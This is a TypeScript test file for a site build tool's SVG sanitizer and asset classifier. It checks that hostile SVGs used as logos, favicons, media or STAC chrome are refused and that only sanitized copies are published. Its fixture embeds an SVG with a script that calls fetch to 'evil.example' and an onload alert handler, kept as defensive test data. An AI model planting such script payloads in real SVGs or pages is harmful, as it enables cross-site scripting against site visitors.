// One sanitizer for every project-owned SVG surface. The assertion that matters is *coverage*:
// identity logo, favicon, prose image, landing image and STAC chrome all publish a sanitized
// derivative and never the input bytes. A new component schema cannot introduce a raw-SVG copy
// path, because there is no second entry point to call.

import { afterAll, describe, expect, it } from "vitest";
import {
  cleanupFixtures,
  codes,
  resolveFixture,
  tempRoot,
  write,
  writeSite,
} from "../helpers/fixture.js";

afterAll(cleanupFixtures);

const HOSTILE = `<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 10 10">
  <script>fetch("https://evil.example")</script>
  <rect width="10" height="10" onload="alert(1)"/>
</svg>
`;

const CLEAN = `<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 10 10"><rect width="10" height="10" fill="#123456"/></svg>`;

describe("project SVG surfaces", () => {
  it("refuses a hostile site logo", async () => {
    const root = tempRoot();
    writeSite(root);
    write(root, "assets/logo.svg", HOSTILE);
    const result = await resolveFixture(root);
    expect(codes(result.diagnostics)).toContain("PC1018");
  });

  it("refuses a hostile favicon", async () => {
    const root = tempRoot();
    writeSite(root);
    write(root, "assets/favicon.svg", HOSTILE);
    const result = await resolveFixture(root);
    expect(codes(result.diagnostics)).toContain("PC1018");
  });

  it("refuses a hostile SVG in a declared asset root", async () => {
    const root = tempRoot();
    writeSite(root, {
      extra: `rendering:
  profile: portal-content-v1
  assets:
    - root: ./media
      mount: /media/
`,
    });
    write(root, "media/diagram.svg", HOSTILE);
    const result = await resolveFixture(root);
    expect(codes(result.diagnostics)).toContain("PC1018");
  });

  it("refuses a hostile STAC chrome image", async () => {
    const root = tempRoot();
    write(root, "assets/catalog.svg", HOSTILE);
    writeSite(root, {
      extra: `services:
  publicCatalog:
    kind: stac
    catalogUrl: /api/stac/
components:
  catalog:
    kind: stac-browser
    enabled: false
    options:
      chrome:
        image: ./assets/catalog.svg
`,
    });
    const result = await resolveFixture(root);
    expect(codes(result.diagnostics)).toContain("PC1018");
  });

  it("publishes only the sanitized derivative, never the input bytes", async () => {
    const root = tempRoot();
    writeSite(root, {
      extra: `rendering:
  profile: portal-content-v1
  assets:
    - root: ./media
      mount: /media/
`,
    });
    // Legal content, but with a comment and a doctype the sanitizer removes.
    write(root, "media/diagram.svg", `<!DOCTYPE svg><!-- private note -->${CLEAN}`);
    const result = await resolveFixture(root);
    expect(result.diagnostics.errors).toEqual([]);
    const published = result.contents.get("media/diagram.svg")!.toString("utf8");
    expect(published).not.toContain("private note");
    expect(published).not.toContain("DOCTYPE");
    const asset = result.model!.embeddableAssets.find((a) => a.file === "media/diagram.svg")!;
    expect(asset.sanitized).toBe(true);
    // The manifest records the input's digest; the published bytes differ.
    const input = result.model!.inputs.find((i) => i.path === "media/diagram.svg")!;
    expect(input.digest).not.toBe(asset.digest);
  });

  it("inlines the sanitized logo into the shell rather than the original", async () => {
    const root = tempRoot();
    writeSite(root);
    write(root, "assets/logo.svg", `<!-- secret -->${CLEAN}`);
    const result = await resolveFixture(root);
    expect(result.model!.site.identity.logo.inlineSvg).toBe(CLEAN.replace("/>", "></rect>"));
    expect(result.model!.site.identity.logo.inlineSvg).not.toContain("secret");
  });
});

describe("asset and download classification", () => {
  it("refuses an active file in an asset root", async () => {
    const root = tempRoot();
    writeSite(root, {
      extra: `rendering:
  profile: portal-content-v1
  assets:
    - root: ./media
      mount: /media/
`,
    });
    write(root, "media/app.js", "alert(1)");
    const result = await resolveFixture(root);
    expect(codes(result.diagnostics)).toContain("FP1401");
  });

  it("gives an unknown download extension a deterministic MIME type and attachment headers", async () => {
    const root = tempRoot();
    writeSite(root, {
      extra: `rendering:
  profile: portal-content-v1
  downloads:
    - root: ./files
      mount: /downloads/
`,
    });
    write(root, "files/data.weirdext", "bytes");
    write(root, "files/table.csv", "a,b\n1,2\n");
    const result = await resolveFixture(root);
    expect(result.diagnostics.errors).toEqual([]);
    const unknown = result.model!.passiveDownloads.find((d) => d.file.endsWith(".weirdext"))!;
    expect(unknown.mimeType).toBe("application/octet-stream");
    expect(unknown.contentDisposition).toBe("attachment");
    const csv = result.model!.passiveDownloads.find((d) => d.file.endsWith(".csv"))!;
    expect(csv.mimeType).toBe("text/csv");
  });

  it("copies a download byte-for-byte", async () => {
    const root = tempRoot();
    writeSite(root, {
      extra: `rendering:
  profile: portal-content-v1
  downloads:
    - root: ./files
      mount: /downloads/
`,
    });
    write(root, "files/notes.txt", "exact bytes\n");
    const result = await resolveFixture(root);
    expect(result.contents.get("downloads/notes.txt")!.toString("utf8")).toBe("exact bytes\n");
  });
});
